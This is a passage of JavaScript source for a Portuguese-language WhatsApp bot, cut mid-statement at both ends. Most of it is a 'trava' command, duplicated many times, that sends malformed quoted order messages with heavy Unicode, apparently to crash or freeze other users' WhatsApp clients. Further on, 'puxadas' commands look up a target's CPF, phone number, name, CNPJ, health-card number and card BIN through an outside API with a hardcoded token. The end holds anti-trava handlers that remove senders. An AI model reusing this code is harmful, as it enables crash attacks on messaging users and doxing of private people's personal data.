pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª'
pl.sendMessage(from, {text: "‚è§ÕûÕüùë∑ùëØ Í™∂Íô≥ ‚Éò‚É§Íô∞*Í´Ç ùë©ùë∂ùëª"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})
break


//========FIM DAS TRAVAS=============\\

//============ CMD NOVOS  ============\\

case 'setnamewpp':
case 'mudarnomewpp':
texto = args.join(` `)
if (!texto) return env(`Exemplo:\n\n*${prefixo}nome...*`)
if (!SoDono) return reply(`Somente meu dono.`)
const namew = texto
await pl.updateProfileName(namew)
reply('*Pronto! Meu Nome do whatsapp foi alterado.*')
break

case 'setrecado':
case 'setbio':
	if (!SoDono) return reply(mess.owner)
if (!q) return reply(`manda exemplo *${prefix}setbio text*`)
pl.setStatus(`${q}`)
pl.sendMessage(from, {text: 'Sucesso, alterou o nome da bio'}, {quoted: selo}).catch((err) => {
reply(`Ocorreu um erro`);
})
break

case 'wame':
case 'wa.me':
reply(`„Äå *LINK WHATSAPP* „Äç\n\n_Solicitado por_ : *${pushname}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n ${nomeBot} `)
break

case 'wa.me2':
case 'wame2':
var oi = q
texf = `
SEU LINK DE WHATSAPP + TEXTO
https://api.whatsapp.com/send?phone=${sender.split('@')[0]}&text=${oi}

BY: ${nomeBot}`
reply(texf)
break

//========== PUXADAS

case 'cpf':
case 'cpf2':
case 'cpf3':
case 'cpf4':
if (q.length < 11 || q.length > 11) return reply(`‚û• Cpf inv√°lido! Insira um com 11 d√≠gitos.`)
if (!q) return reply(`exemplo: ${prefix+command} cpfdoalvo`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/${command}?cpf=${q}&token=key-consultas-daniel_vip`)
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
console.log(`~> Consultando o cpf: ${q}`)
ddskkj = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n          üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùóñùó£ùóô üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n${getInfo.resultado}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(ddskkj)
} catch {
reply("‚ö† Cpf n√£o encontrado ou inv√°lido!")
}
break

case 'tel':
case 'tel2':
case 'tel3':
case 'tel4':
if (q.length < 11 || q.length > 11) return reply(`‚û• Telefone invalido! Insira um com 11 d√≠gitos.\n‚û• Verifique se o n√∫mero est√° sem espa√ßos e sem caracteres especiais.`)
if (!q) return reply(`exemplo: ${prefix+command} numerodoalvo`)
getQuery = args.join(" ")
.split('+').join('')
.split('-').join('')
.split('.').join('')
.split('(').join('')
.split(')').join('');
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
console.log(`~> Consultando o telefone: ${getQuery}`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/${command}?telefone=${q}&token=key-consultas-daniel_vip`)
let Dadoskkj = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n   üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùóßùóòùóüùóòùóôùó¢ùó°ùóò üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n${getInfo.resultado}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(Dadoskkj)
} catch(err) {
console.log(err)
reply("‚ö† Telefone n√£o encontrado ou inv√°lido!")
}
break

case 'nome':
case 'nome2':
case 'nome3':
case 'nome4':
if (q.length < 10) return reply(`‚û• Nome inv√°lido!`)
if (!q) return reply(`exemplo: ${prefix+command} nomedoalvo`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/nome?nome=${q}&token=key-consultas-daniel_vip`)
getQuery = args.join(" ")
.split('+').join('')
.split('-').join('')
.split('.').join('')
.split('(').join('')
.split(')').join('');
console.log(`~> Consultando o nome: ${getQuery}`)
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
infot = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n         üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùó°ùó¢ùó†ùóò üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n${getInfo.resultado}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(infot)
} catch {
reply("‚ö† Nome n√£o encontrado ou inv√°lido!")
}
break

case 'bin':
case 'bin2':
case 'bin3':
case 'bin4':
if (q.length < 6 | q.length > 6 ) return reply(`‚û• Bin inv√°lido!`)
if (!q) return reply(`exemplo: ${prefix+command} bin`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/bin?bin=${q}&token=key-consultas-daniel_vip`)
getQuery = args.join(" ")
.split('+').join('')
.split('-').join('')
.split('.').join('')
.split('(').join('')
.split(')').join('');
console.log(`~> Consultando a bin: ${getQuery}`)
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
infot = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n          üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùóïùóúùó° üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n‚Ä¢ BIN: ${getInfo.resultado.bin}\n‚Ä¢ BANDEIRA: ${getInfo.resultado.bandeira}\n‚Ä¢ BANCO: ${getInfo.resultado.banco}\n‚Ä¢ TIPO: ${getInfo.resultado.tipo}\n‚Ä¢ N√çVEL: ${getInfo.resultado.nivel}\n‚Ä¢ PA√çS: ${getInfo.resultado.pais}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(infot)
} catch {
reply("‚ö†Ô∏è Bin n√£o encontrado/inv√°lido!")
}
break

case 'cnpj':
case 'cnpj2':
case 'cnpj3':
case 'cnpj4':
if (!q) return reply(`‚û• Cnpj inv√°lido! Insira uma com 14 d√≠gitos.\nVerifique se o cnpj est√° sem caracteres especiais.`)
getQuery = args.join(" ")
.split('+').join('')
.split('-').join('')
.split('.').join('')
.split('(').join('')
.split(')').join('');
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
console.log(`~> Consultando o cnpj: ${getQuery}`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/cnpj?cnpj=${q}&token=key-consultas-daniel_vip`)
let Dadoskkj = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n         üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùóñùó°ùó£ùóù üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n${getInfo.resultado}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(Dadoskkj)
} catch(err) {
console.log(err)
reply("‚ö†Ô∏è Cnpj n√£o encontrado/inv√°lido!")
}
break

case 'cns':
case 'cns2':
case 'cns3':
if (q.length < 15 || q.length > 15) return reply(`‚û• Cns inv√°lido! Insira uma com 15 d√≠gitos.\nVerifique se o cns est√° sem caracteres especiais.`)
getQuery = args.join(" ")
.split('+').join('')
.split('-').join('')
.split('.').join('')
.split('(').join('')
.split(')').join('');
reply(`Aguarde ${pushname}, estou a procurar os dados do alvo em meu banco de dados...`)
console.log(`~> Consultando o cns: ${getQuery}`)
try {
let getInfo = await fetchJson(`http://nezsab-apis.herokuapp.com/api-consultas/cns?cns=${q}&token=key-consultas-daniel_vip`)
let Dadoskkj = `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n          üîé ùóñùó¢ùó°ùó¶ùó®ùóüùóßùóî ùóóùóò ùóñùó°ùó¶ üîç\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\n${getInfo.resultado}\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\nüîõ *BY:* ${NomeDoBot}`
reply(Dadoskkj)
} catch(err) {
console.log(err)
reply("‚ö†Ô∏è Cns n√£o encontrado/inv√°lido!")
}
break

//============= FIM



default:


//========================================

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return pl.sendMessage(from, {text: 'Contato detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: m})
await pl.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contato ou vcard, caso for um engano, fale com algum adm.'}, {quoted: selo})
await pl.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
pl.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await pl.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
pl.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await pl.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await pl.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await pl.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return pl.sendMessage(from, {text: 'Contato detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: m})
await pl.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contatos'}, {quoted: selo})
await pl.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
pl.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await pl.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
pl.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await pl.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await pl.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await pl.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return pl.sendMessage(from, {text: 'Localiza√ß√£o detectada, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: m})
await pl.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Localiza√ß√£o ou localiza√ß√£o comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await pl.groupSettingUpdate(from, 'announcement')
await sleep(2000);
